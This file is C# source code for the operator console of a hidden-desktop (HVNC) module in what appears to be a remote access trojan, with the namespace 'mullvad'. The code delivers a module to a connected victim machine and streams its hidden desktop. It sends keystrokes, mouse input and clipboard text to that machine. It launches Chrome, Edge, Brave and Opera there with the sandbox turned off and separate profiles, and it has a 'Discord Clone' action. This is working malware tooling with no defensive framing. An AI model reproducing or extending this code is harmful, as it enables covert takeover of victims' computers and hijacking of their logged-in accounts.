using System;
using System.Collections.Generic;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms
{
    internal sealed class HvncForm : Form
    {
        // ── Module wiring ─────────────────────────────────────────────────────
        private const string ModuleFile = "mullvad.Module.Hvnc";
        private const string ModuleId   = "mullvad.hvnc";

        private readonly ClientHandler _handler;
        private ModuleContext?         _ctx;

        // ── Stream state ──────────────────────────────────────────────────────
        private CancellationTokenSource _streamCts = new();
        private volatile bool            _streaming;
        private int                      _remoteW = 1280, _remoteH = 720;
        private Image?                   _currentFrame;
        private readonly object          _frameLock  = new();
        private readonly List<string>    _inputQueue = new(32);
        private readonly object          _inputLock  = new();

        // ── Clipboard sync ────────────────────────────────────────────────────
        private System.Windows.Forms.Timer _clipTimer = null!;
        private string _lastClipText = "";

        // ── Singleton per client ──────────────────────────────────────────────
        private static readonly Dictionary<ClientHandler, HvncForm> _openForms = new();

        public static HvncForm CreateOrActivate(ClientHandler handler)
        {
            if (_openForms.TryGetValue(handler, out var existing) && !existing.IsDisposed)
            {
                existing.BringToFront();
                return existing;
            }
            var frm = new HvncForm(handler);
            frm.FormClosed += (_, _) => _openForms.Remove(handler);
            _openForms[handler] = frm;
            return frm;
        }

        private HvncForm(ClientHandler handler)
        {
            _handler = handler;
            handler.Disconnected += OnDisconnected;
            Build();
        }

        // ── UI controls ───────────────────────────────────────────────────────
        private DisplayCanvas _displayPanel = null!;
        private Panel         _bottomPanel  = null!;

        // Remote Input group
        private CheckBox _chkKeyboard    = null!;
        private CheckBox _chkMouseClicks = null!;
        private CheckBox _chkMouseMove   = null!;

        // Options group
        private CheckBox _chkAutoStart = null!;
        private CheckBox _chkClipboard = null!;

        // Launch group
        private ComboBox _cmbApp     = null!;
        private Button   _btnLaunch  = null!, _btnCustom = null!, _btnKillAll = null!;

        // Stream controls
        private Button   _btnStart   = null!, _btnStop = null!;
        private TrackBar _trkQuality = null!;
        private Label    _lblQualVal = null!;

        // Status
        private ToolStripStatusLabel _lblStatus = null!;

        private int _quality => _trkQuality?.Value ?? 70;

        // Action is the module action to send; null/"exec" sends exec with Cmd as path payload
        private static readonly (string Label, string Cmd, string Action)[] AppEntries =
        {
            ("Explorer",       "explorer.exe",                                                                                                                                           "exec"),
            ("Chrome",         @"%ProgramFiles%\Google\Chrome\Application\chrome.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --user-data-dir=%TEMP%\hvnc_chrome", "exec"),
            ("Edge",           @"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --user-data-dir=%TEMP%\hvnc_edge", "exec"),
            ("Firefox",        @"%ProgramFiles%\Mozilla Firefox\firefox.exe -profile %TEMP%\hvnc_ff -no-remote -width 1280 -height 720",                                                "exec"),
            ("Brave",          @"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --user-data-dir=%TEMP%\hvnc_brave", "exec"),
            ("Opera",          @"%LOCALAPPDATA%\Programs\Opera\opera.exe --no-sandbox --allow-no-sandbox-job --disable-gpu --start-maximized --no-first-run --user-data-dir=%TEMP%\hvnc_opera", "exec"),
            ("Telegram",       @"%APPDATA%\Telegram Desktop\Telegram.exe",                                                                                                              "exec"),
            ("Discord",        @"%LOCALAPPDATA%\Discord\Update.exe --processStart Discord.exe",                                                                                         "exec"),
            ("Discord Clone",  "",                                                                                                                                                       "clone_discord"),
            ("Notepad",        @"%SystemRoot%\System32\notepad.exe",                                                                                                                    "exec"),
            ("cmd",            @"%SystemRoot%\System32\cmd.exe",                                                                                                                        "exec"),
        };

        private void Build()
        {
            SuspendLayout();

            Text          = $"Hidden Desktop  —  {_handler.Info.Computer}";
            ClientSize    = new Size(900, 580);
            MinimumSize   = new Size(640, 480);
            Font          = new Font("Segoe UI", 9F);
            StartPosition = FormStartPosition.CenterParent;
            ShowInTaskbar = true;
            KeyPreview    = true;

            var iconBmp = IconLoader.Load("monitor.png") as Bitmap;
            if (iconBmp is not null) try { Icon = Icon.FromHandle(iconBmp.GetHicon()); } catch { }
            else Icon = SystemIcons.Application;

            // ── Status strip ──────────────────────────────────────────────────
            var strip = new StatusStrip { SizingGrip = false };
            _lblStatus = new ToolStripStatusLabel("Ready") { Spring = true };
            strip.Items.Add(_lblStatus);

            // ── Bottom control panel (matches RemoteDesktopForm layout) ────────
            _bottomPanel = new Panel { Dock = DockStyle.Bottom, Height = 72, Padding = new Padding(4, 4, 4, 4) };

            // Remote Input group
            var grpInput = new GroupBox { Text = "Remote Input", Left = 4, Top = 4, Width = 142, Height = 60, Font = new Font("Segoe UI", 8F) };
            _chkKeyboard    = new CheckBox { Text = "Keyboard",       Left = 8, Top = 14, Width = 120, AutoSize = true };
            _chkMouseClicks = new CheckBox { Text = "Mouse clicks",   Left = 8, Top = 30, Width = 120, AutoSize = true };
            _chkMouseMove   = new CheckBox { Text = "Mouse movement", Left = 8, Top = 46, Width = 120, AutoSize = true };
            grpInput.Controls.AddRange(new Control[] { _chkKeyboard, _chkMouseClicks, _chkMouseMove });

            // Options group
            var grpOpts = new GroupBox { Text = "Options", Left = 152, Top = 4, Width = 150, Height = 60, Font = new Font("Segoe UI", 8F) };
            _chkAutoStart = new CheckBox { Text = "AutoStart",      Left = 8, Top = 14, Width = 134, AutoSize = true };
            _chkClipboard = new CheckBox { Text = "Clipboard sync", Left = 8, Top = 30, Width = 134, AutoSize = true };
            grpOpts.Controls.AddRange(new Control[] { _chkAutoStart, _chkClipboard });

            // Launch group
            var grpLaunch = new GroupBox { Text = "Launch", Left = 308, Top = 4, Width = 254, Height = 60, Font = new Font("Segoe UI", 8F) };
            _cmbApp = new ComboBox { Left = 8, Top = 14, Width = 90, DropDownStyle = ComboBoxStyle.DropDownList, FlatStyle = FlatStyle.Flat };
            foreach (var (label, _, _) in AppEntries) _cmbApp.Items.Add(label);
            _cmbApp.SelectedIndex = 0;
            _btnLaunch  = new Button { Text = "Launch",   Left = 104, Top = 13, Width = 56, Height = 22, FlatStyle = FlatStyle.Flat };
            _btnCustom  = new Button { Text = "Custom…",  Left = 164, Top = 13, Width = 56, Height = 22, FlatStyle = FlatStyle.Flat };
            _btnKillAll = new Button { Text = "Kill All", Left = 190, Top = 36, Width = 56, Height = 20, FlatStyle = FlatStyle.Flat };
            grpLaunch.Controls.AddRange(new Control[] { _cmbApp, _btnLaunch, _btnCustom, _btnKillAll });
            _btnLaunch.Click  += BtnLaunch_Click;
            _btnCustom.Click  += BtnCustom_Click;
            _btnKillAll.Click += (_, _) => _ = SendCmdAsync("kill_all");

            // Quality slider
            var lblQ    = new Label { Text = "Quality:", Left = 570, Top = 20, AutoSize = true };
            _trkQuality = new TrackBar { Left = 624, Top = 10, Width = 110, Height = 30, Minimum = 10, Maximum = 100, Value = 70, SmallChange = 5, LargeChange = 10, TickFrequency = 10, TickStyle = TickStyle.BottomRight };
            _lblQualVal = new Label { Text = "70", Left = 738, Top = 20, Width = 24, AutoSize = false };
            _trkQuality.ValueChanged += (_, _) => _lblQualVal.Text = _trkQuality.Value.ToString();

            // Start / Stop
            _btnStart = new Button { Text = "Start", Left = 768, Top = 16, Width = 52, Height = 26, FlatStyle = FlatStyle.Flat };
            _btnStop  = new Button { Text = "Stop",  Left = 824, Top = 16, Width = 52, Height = 26, FlatStyle = FlatStyle.Flat, Enabled = false };
            _btnStart.Click += (_, _) => StartStream();
            _btnStop.Click  += (_, _) => StopStream();

            _bottomPanel.Controls.AddRange(new Control[] {
                grpInput, grpOpts, grpLaunch,
                lblQ, _trkQuality, _lblQualVal,
                _btnStart, _btnStop
            });

            // ── Display panel ─────────────────────────────────────────────────
            _displayPanel = new DisplayCanvas { Dock = DockStyle.Fill, BackColor = Color.Black };
            _displayPanel.Paint      += DisplayPanel_Paint;
            _displayPanel.MouseDown        += DisplayPanel_MouseDown;
            _displayPanel.MouseUp          += DisplayPanel_MouseUp;
            _displayPanel.MouseMove        += DisplayPanel_MouseMove;
            _displayPanel.MouseWheel       += DisplayPanel_MouseWheel;
            _displayPanel.MouseDoubleClick += DisplayPanel_MouseDoubleClick;
            _displayPanel.MouseClick       += (_, _) => _displayPanel.Focus();

            Controls.Add(_displayPanel);
            Controls.Add(_bottomPanel);
            Controls.Add(strip);

            // ── Clipboard timer ───────────────────────────────────────────────
            _clipTimer = new System.Windows.Forms.Timer { Interval = 400 };
            _clipTimer.Tick += ClipTimer_Tick;

            _chkClipboard.CheckedChanged += (_, _) =>
            {
                if (_chkClipboard.Checked) { _lastClipText = ""; _clipTimer.Start(); }
                else { _clipTimer.Stop(); _lastClipText = ""; }
            };

            KeyDown += Form_KeyDown;
            KeyUp   += Form_KeyUp;

            Load        += (_, _) => { if (_chkAutoStart.Checked) StartStream(); };
            FormClosing += HvncForm_Closing;

            ResumeLayout(false);
        }

        // ── Events ────────────────────────────────────────────────────────────

        private void HvncForm_Closing(object? sender, FormClosingEventArgs e)
        {
            _clipTimer.Stop();
            if (_streaming) StopStream();
            _handler.Disconnected -= OnDisconnected;
            _streamCts.Cancel();
            _ctx?.Dispose();
            lock (_frameLock) { _currentFrame?.Dispose(); _currentFrame = null; }
        }

        private void OnDisconnected(ClientHandler _)
        {
            if (!IsDisposed) Invoke((MethodInvoker)Close);
        }

        protected override void OnResize(EventArgs e)
        {
            base.OnResize(e);
        }

        // ── Stream control ────────────────────────────────────────────────────

        private void StartStream()
        {
            if (_streaming) return;
            _streaming        = true;
            _btnStart.Enabled = false;
            _btnStop.Enabled  = true;

            _streamCts = new CancellationTokenSource();
            _ = StreamLoopAsync(_streamCts.Token);
        }

        private void StopStream()
        {
            if (!_streaming) return;
            _streaming        = false;
            _btnStart.Enabled = true;
            _btnStop.Enabled  = false;
            _streamCts.Cancel();
            _ = SendCmdAsync("stop");
        }

        private async Task StreamLoopAsync(CancellationToken ct)
        {
            try
            {
                var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
                if (bytes == null) { SetStatus("Module not found"); return; }

                using var deliverCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                deliverCts.CancelAfter(TimeSpan.FromSeconds(30));
                bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, bytes, null, deliverCts.Token);
                if (!ok) { SetStatus("Module delivery failed"); return; }

                _ctx?.Dispose();
                _ctx = new ModuleContext(_handler, ModuleId);
                _ctx.Disconnected += (_, _) => { if (!IsDisposed) Invoke((MethodInvoker)StopStream); };

                int q = _quality;
                using var startCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                startCts.CancelAfter(TimeSpan.FromSeconds(10));
                await _ctx.ExecuteAsync("start", $"{{\"quality\":{q},\"fps\":30}}", startCts.Token);

                SetStatus($"Streaming  Q:{q}");

                while (_streaming && !ct.IsCancellationRequested)
                {
                    try
                    {
                        string inputJson = BuildInputPayload();
                        using var fCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                        fCts.CancelAfter(TimeSpan.FromSeconds(5));

                        var resp = await _ctx.ExecuteAsync("get_frame", $"{{\"input\":{inputJson}}}", fCts.Token);

                        if (resp?.Contains("\"ok\":true") == true)
                        {
                            int di = resp.IndexOf("\"data\":\"");
                            if (di >= 0)
                            {
                                int s = di + 8, e = resp.IndexOf('"', s);
                                if (e > s)
                                {
                                    byte[] imgBytes = Convert.FromBase64String(resp.Substring(s, e - s));
                                    var bmp = Image.FromStream(new System.IO.MemoryStream(imgBytes), false, false);
                                    lock (_frameLock) { _currentFrame?.Dispose(); _currentFrame = bmp; }
                                    if (!IsDisposed) _displayPanel.Invalidate();

                                    int w = ParseInt(resp, "w", 0), h = ParseInt(resp, "h", 0);
                                    if (w > 0) _remoteW = w;
                                    if (h > 0) _remoteH = h;
                                }
                            }
                        }
                    }
                    catch (OperationCanceledException) { break; }
                    catch { await Task.Delay(200, ct); }
                }
            }
            catch (OperationCanceledException) { }
            catch (Exception ex) { SetStatus("Error: " + ex.Message); }
            finally { if (!IsDisposed) Invoke((MethodInvoker)(() => { _btnStart.Enabled = true; _btnStop.Enabled = false; })); }
        }

        // ── Input ─────────────────────────────────────────────────────────────

        private string BuildInputPayload()
        {
            lock (_inputLock)
            {
                if (_inputQueue.Count == 0) return "[]";
                var sb = new StringBuilder("[");
                for (int i = 0; i < _inputQueue.Count; i++)
                {
                    if (i > 0) sb.Append(',');
                    sb.Append(_inputQueue[i]);
                }
                sb.Append(']');
                _inputQueue.Clear();
                return sb.ToString();
            }
        }

        private void EnqueueInput(string ev)
        {
            lock (_inputLock) { if (_inputQueue.Count < 64) _inputQueue.Add(ev); }
        }

        private void DisplayPanel_MouseDoubleClick(object? sender, MouseEventArgs e)
        {
            if (!_chkMouseClicks.Checked || !_streaming) return;
            _displayPanel.Focus();
            int rx = e.X * _remoteW / Math.Max(1, _displayPanel.Width);
            int ry = e.Y * _remoteH / Math.Max(1, _displayPanel.Height);
            EnqueueInput($"{{\"t\":\"mdc\",\"x\":{rx},\"y\":{ry}}}");
        }

        private void DisplayPanel_MouseDown(object? sender, MouseEventArgs e)
        {
            if (!_chkMouseClicks.Checked || !_streaming) return;
            _displayPanel.Focus();
            int btn = e.Button == MouseButtons.Left ? 0 : e.Button == MouseButtons.Right ? 1 : 2;
            int rx  = e.X * _remoteW / Math.Max(1, _displayPanel.Width);
            int ry  = e.Y * _remoteH / Math.Max(1, _displayPanel.Height);
            EnqueueInput($"{{\"t\":\"mc\",\"x\":{rx},\"y\":{ry},\"btn\":{btn},\"dn\":1}}");
        }

        private void DisplayPanel_MouseUp(object? sender, MouseEventArgs e)
        {
            if (!_chkMouseClicks.Checked || !_streaming) return;
            int btn = e.Button == MouseButtons.Left ? 0 : e.Button == MouseButtons.Right ? 1 : 2;
            int rx  = e.X * _remoteW / Math.Max(1, _displayPanel.Width);
            int ry  = e.Y * _remoteH / Math.Max(1, _displayPanel.Height);
            EnqueueInput($"{{\"t\":\"mc\",\"x\":{rx},\"y\":{ry},\"btn\":{btn},\"dn\":0}}");
        }

        private void DisplayPanel_MouseMove(object? sender, MouseEventArgs e)
        {
            if (!_chkMouseMove.Checked || !_streaming) return;
            int rx = e.X * _remoteW / Math.Max(1, _displayPanel.Width);
            int ry = e.Y * _remoteH / Math.Max(1, _displayPanel.Height);
            EnqueueInput($"{{\"t\":\"mm\",\"x\":{rx},\"y\":{ry}}}");
        }

        private void DisplayPanel_MouseWheel(object? sender, MouseEventArgs e)
        {
            if (!_chkMouseClicks.Checked || !_streaming) return;
            int rx = e.X * _remoteW / Math.Max(1, _displayPanel.Width);
            int ry = e.Y * _remoteH / Math.Max(1, _displayPanel.Height);
            EnqueueInput($"{{\"t\":\"mw\",\"delta\":{e.Delta},\"x\":{rx},\"y\":{ry}}}");
        }

        private void Form_KeyDown(object? sender, KeyEventArgs e)
        {
            if (!_chkKeyboard.Checked || !_streaming) return;
            EnqueueInput($"{{\"t\":\"kd\",\"vk\":{(int)e.KeyCode}}}");
            e.Handled = true;
        }

        private void Form_KeyUp(object? sender, KeyEventArgs e)
        {
            if (!_chkKeyboard.Checked || !_streaming) return;
            EnqueueInput($"{{\"t\":\"ku\",\"vk\":{(int)e.KeyCode}}}");
            e.Handled = true;
        }

        // ── Clipboard ─────────────────────────────────────────────────────────

        private void ClipTimer_Tick(object? sender, EventArgs e)
        {
            if (IsDisposed) { _clipTimer.Stop(); return; }
            string text;
            try { text = Clipboard.GetText(); }
            catch { return; }
            if (string.IsNullOrEmpty(text) || text == _lastClipText) return;
            _lastClipText = text;
            string escaped = text.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
            _ = SendCmdAsync("clipboard", $"{{\"text\":\"{escaped}\"}}");
        }

        // ── App launch ────────────────────────────────────────────────────────

        private void BtnLaunch_Click(object? sender, EventArgs e)
        {
            int idx = _cmbApp.SelectedIndex;
            if (idx < 0 || idx >= AppEntries.Length) return;
            var (_, cmd, action) = AppEntries[idx];
            if (action == "exec")
                _ = SendCmdAsync("exec", $"{{\"path\":\"{cmd.Replace("\\", "\\\\").Replace("\"", "\\\"")}\"}}");
            else
                _ = SendCmdAsync(action, "{}");
        }

        private void BtnCustom_Click(object? sender, EventArgs e)
        {
            using var dlg = new HvncCustomPathDialog();
            if (dlg.ShowDialog(this) == DialogResult.OK && !string.IsNullOrWhiteSpace(dlg.Path))
            {
                string p = dlg.Path.Trim().Replace("\\", "\\\\").Replace("\"", "\\\"");
                _ = SendCmdAsync("exec", $"{{\"path\":\"{p}\"}}");
            }
        }

        // ── Paint ─────────────────────────────────────────────────────────────

        private void DisplayPanel_Paint(object? sender, PaintEventArgs e)
        {
            Image? frame;
            lock (_frameLock) { frame = _currentFrame; }
            if (frame == null) { e.Graphics.Clear(Color.Black); return; }
            e.Graphics.DrawImage(frame, 0, 0, _displayPanel.Width, _displayPanel.Height);
        }

        // ── Helpers ───────────────────────────────────────────────────────────

        private async Task SendCmdAsync(string action, string payload = "{}")
        {
            if (_ctx == null) return;
            try
            {
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
                await _ctx.ExecuteAsync(action, payload, cts.Token);
            }
            catch { }
        }

        private void SetStatus(string text)
        {
            if (IsDisposed) return;
            if (InvokeRequired) { Invoke(new Action(() => SetStatus(text))); return; }
            _lblStatus.Text = text;
        }

        private static int ParseInt(string json, string key, int def)
        {
            if (string.IsNullOrEmpty(json)) return def;
            var k   = "\"" + key + "\"";
            int idx = json.IndexOf(k);
            if (idx < 0) return def;
            int colon = json.IndexOf(':', idx + k.Length);
            if (colon < 0) return def;
            int s = colon + 1;
            while (s < json.Length && json[s] == ' ') s++;
            bool neg = s < json.Length && json[s] == '-';
            if (neg) s++;
            int e = s;
            while (e < json.Length && char.IsDigit(json[e])) e++;
            if (e == s) return def;
            return int.TryParse(json.Substring(s, e - s), out int v) ? (neg ? -v : v) : def;
        }
    }

    // ── Double-buffered display surface (eliminates white/black flicker) ──────
    internal sealed class DisplayCanvas : Panel
    {
        public DisplayCanvas()
        {
            DoubleBuffered = true;
            SetStyle(ControlStyles.AllPaintingInWmPaint |
                     ControlStyles.UserPaint            |
                     ControlStyles.OptimizedDoubleBuffer, true);
        }

        protected override void OnPaintBackground(PaintEventArgs e) { }
    }

    // ── Custom path dialog ────────────────────────────────────────────────────

    internal sealed class HvncCustomPathDialog : Form
    {
        public string? Path { get; private set; }
        private TextBox _txtPath = null!;

        public HvncCustomPathDialog()
        {
            Text            = "Custom Path";
            Size            = new Size(500, 130);
            FormBorderStyle = FormBorderStyle.FixedDialog;
            MaximizeBox     = false;
            MinimizeBox     = false;
            StartPosition   = FormStartPosition.CenterParent;
            ShowInTaskbar   = false;

            var lbl = new Label
            {
                Text     = "Path on the client machine (env vars expanded, e.g. %APPDATA%\\app.exe)",
                Location = new Point(10, 10),
                Size     = new Size(460, 20),
                Font     = new Font("Segoe UI", 9F),
            };

            _txtPath = new TextBox
            {
                Location = new Point(10, 35),
                Size     = new Size(460, 24),
                Font     = new Font("Segoe UI", 10F),
            };

            var btnLaunch = new Button
            {
                Text     = "Launch",
                Location = new Point(10, 65),
                Size     = new Size(80, 28),
                FlatStyle = FlatStyle.Flat,
            };
            btnLaunch.Click += (_, _) => { Path = _txtPath.Text; DialogResult = DialogResult.OK; Close(); };

            var btnCancel = new Button
            {
                Text     = "Cancel",
                Location = new Point(100, 65),
                Size     = new Size(80, 28),
            };
            btnCancel.Click += (_, _) => { DialogResult = DialogResult.Cancel; Close(); };

            _txtPath.KeyDown += (_, ke) =>
            {
                if (ke.KeyCode == Keys.Enter)  { Path = _txtPath.Text; DialogResult = DialogResult.OK; Close(); }
                if (ke.KeyCode == Keys.Escape) { DialogResult = DialogResult.Cancel; Close(); }
            };

            Controls.AddRange(new Control[] { lbl, _txtPath, btnLaunch, btnCancel });
            Load += (_, _) => _txtPath.Focus();
        }
    }
}
